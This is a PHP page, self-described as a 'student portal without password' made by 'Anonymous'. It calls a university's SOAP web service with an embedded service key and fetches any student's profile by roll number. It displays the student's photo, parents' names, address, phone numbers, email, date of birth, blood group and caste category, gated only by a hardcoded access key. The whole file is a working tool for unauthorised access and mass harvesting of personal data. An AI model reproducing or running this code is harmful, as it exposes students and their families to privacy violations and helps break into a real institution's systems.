<html>
<head>
    <title>STUDENT PANEL FOR GLA</title>
    <style>
        body{
            background-repeat: no-repeat;
            background-size:100% 100%;

        }
        .atag{
            color: red;
            padding-left: 100px;
            text-decoration: white;
            font-weight: bold;
            font-family: "Cooper Black";
        }
        .btag{
            color: red;
            padding-left: 200px;
            text-decoration: white;
            font-weight: bold;
            font-family: "Cooper Black";
        }

        .topnav {
            background-color: #333;
            overflow: hidden;
        }

        /* Style the links inside the navigation bar */
        .topnav a {
            float: left;
            color: #f2f2f2;
            text-align: center;
            padding: 14px 16px;
            text-decoration: none;
            font-size: 17px;
        }

        /* Change the color of links on hover */
        .topnav a:hover {
            background-color: #ddd;
            color: black;
        }

        /* Add a color to the active/current link */

    </style>
</head>
</html>
<?php
if(!isset($_POST['submit'])) {
echo '<body class="kk"  id="kk"  background="https://www.kunm.org/sites/kunm/files/styles/x_large/public/201801/Anonymous.jpg"   >
<h1  align="center"	style="color: yellow"> GLA STUDENT PORTAL WITHOUT PASSWORD</h1>
<h2  align="center" style="color: palevioletred">Inject and coded by Anonymous</h2>

<div align="center">
    <form action="" method="post">
       <p style="color: red">ROLL NO:
        <input type="text" name="roll" id="roll" placeholder="ENTER ROLL NO" required>
        </p>
        
         <p style="color: red"> ENETR KEY
         <input type="text" name="access" id="access" placeholder="ENTER ACCESS KEY" required>
         
         </p>
         
        <input type="submit" name="submit" id="submit" value="submit">
        
    </form>
</div>
</body>';
}
?>
<?php
error_reporting(0);
echo "<body bgcolor= #f0e68c>";
session_start();
header("Cache-Control: no cache");
session_cache_limiter("private_no_expire");
//Data, connection, auth
if(isset($_POST['submit'])) {
    if($_POST['access']=='glatuthogya') {


        if ($_POST['roll'] == 181500329) {
            echo "<h2 align='center' style='color: crimson'>";
            echo "fuckoff";
            echo "</h2>";
        } else {
            $roll = $_POST['roll'];
            $roll = $_POST['roll'];
            $_SESSION['roll']=$roll;


           echo'<div class="topnav">
  <a class="active" href="timetable/">TIME TABLE</a>
  <a href="att/">ATTENDANCE</a>
  <a href="result/">SEM WISE RESULT</a>
  <a href="lib/">LIBRARY</a>
  <a href="hierarchy/">HIERARCHY</a>
  
</div>';

            $soapUrl = "http://glauniversity.in/connectapp.asmx"; // asmx URL of WSDL
            $soapUser = "username";  //  username
            $soapPassword = "password"; // password


// xml post structure

            $xml_post_string = '<?xml version="1.0" encoding="utf-8"?>
                     <v:Envelope xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns:d="http://www.w3.org/2001/XMLSchema" xmlns:c="http://schemas.xmlsoap.org/soap/encoding/" xmlns:v="http://schemas.xmlsoap.org/soap/envelope/"><v:Header /><v:Body><StudentProfile xmlns="http://tempuri.org/" id="o0" c:root="1"><rollno i:type="d:string">' . $roll . '</rollno><servicekey i:type="d:string">thisismycommunicationapp</servicekey><servicetype i:type="d:string">SOFT</servicetype></StudentProfile></v:Body></v:Envelope>';
            $headers = array(
                "Content-type: text/xml;charset=\"utf-8\"",
                "Accept: text/xml",
                "Cache-Control: no-cache",
                "Pragma: no-cache",
                "SOAPAction: http://tempuri.org/StudentProfile",
                "Host: glauniversity.in",
                "Content-length: " . strlen($xml_post_string),
            ); //SOAPAction: your op URL

            $url = $soapUrl;

// PHP cURL  for https connection with auth
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
//curl_setopt($ch, CURLOPT_USERPWD, $soapUser.":".$soapPassword); // username and password - declared at the top of the doc
//curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_ANY);
            curl_setopt($ch, CURLOPT_TIMEOUT, 10);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $xml_post_string); // the SOAP request
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

// converting
            $response = curl_exec($ch);

            curl_close($ch);
//echo "$response";
            preg_match_all("/<string[^>]*>[^>]*<\/string>/", $response, $return);
// converting
            $_SESSION['name']=$return[0][2];
            $response1 = str_replace("<soap:Body>", "", $response);
            $response2 = str_replace("</soap:Body>", "", $response1);

// convertingc to XML
            $parser = simplexml_load_string($response2);
// user $parser to get your data out of XML response and to display it.
            if ($response) {
               echo"<br>";
                echo "<div align='center'>";
                echo "<a> <img style=\"-webkit-user-select: none;margin: auto;\" src=\"https://glauniversity.in:8103/$roll.jpg\"> </a>";
                echo "</div>";

                echo " <br>";
                echo "<h4 align='center' style='color: crimson'>";
                print_r("ROLL NUMBER =>" . $return[0][1]);
                echo "</h4>";
                echo "<h4 align='center' style='color: crimson'>";
                print_r("NAME=>" . $return[0][2]);
                echo "</h4>";
                echo "<h4 align='center' style='color: crimson'>";
                print_r(" FATHERS NAME =>" . $return[0][3]);
                echo "</h4>";
                echo "<h4 align='center' style='color: crimson'>";
                print_r(" MOTHERS NAME =>" . $return[0][15]);
                echo "</h4>";
                echo "<h4 align='center' style='color: crimson'>";
                print_r("RUNNING SEMSTER =>" . $return[0][4]);
                echo "</h4>";
                echo "<h4 align='center' style='color: crimson'>";
                print_r("STREAM =>" . $return[0][5]);
                echo "</h4>";
                echo "<h4 align='center' style='color: crimson'>";
                print_r($return[0][6]);
                echo "</h4>";
                echo "<h4 align='center' style='color: crimson'>";
                print_r($return[0][7]);
                echo "</h4>";
                echo "<h4 align='center' style='color: crimson'>";
                print_r("ADDRESS =>" . $return[0][9]);
                echo "</h4>";
                echo "<h4 align='center' style='color: crimson'>";
                print_r("STUDENT MOBILE NUMBER =>" . $return[0][10]);
                echo "</h4>";
                echo "<h4 align='center' style='color: crimson'>";
                print_r("FATHERS MOBILE NUMBER =>" . $return[0][11]);
                echo "</h4>";
                echo "<h4 align='center' style='color: crimson'>";
                print_r("STUDENTS EMAIL =>" . $return[0][12]);
                echo "</h4>";
                echo "<h4 align='center' style='color: crimson'>";
                print_r("REGISTRATION STATUS =>" . $return[0][13]);
                echo "</h4>";
                echo "<h4 align='center' style='color: crimson'>";
                print_r("LOCAL GURDIANS =>" . $return[0][16]);
                echo "</h4>";
                echo "<h4 align='center' style='color: crimson'>";
                print_r("LOCAL GURDIANS COTACT =>" . $return[0][18]);
                echo "</h4>";
                echo "<h4 align='center' style='color: crimson'>";
                print_r("STUDENT DOB =>" . $return[0][20]);
                echo "</h4>";
                echo "<h4 align='center' style='color: crimson'>";
                print_r("STUDENT GENDER =>" . $return[0][21]);
                echo "</h4>";
                echo "<h4 align='center' style='color: crimson'>";
                print_r("BLOOD GROUP =>" . $return[0][22]);
                echo "</h4>";
                echo "<h4 align='center' style='color: crimson'>";
                print_r("CATEGORY =>" . $return[0][23]);
                echo "</h4>";
            } else {
                echo "<h4 align='center' style='color: crimson'>";
                print_r(" GLA'S SERVER DOWN TRY AGAIN LATER");
                echo "</h4>";
            }
        }
    }
   else{
       echo "<h4 align='center' style='color: crimson'>";
       print_r(" INVALID ACCESS KEY");
       echo "</h4>";
   }
}
?>

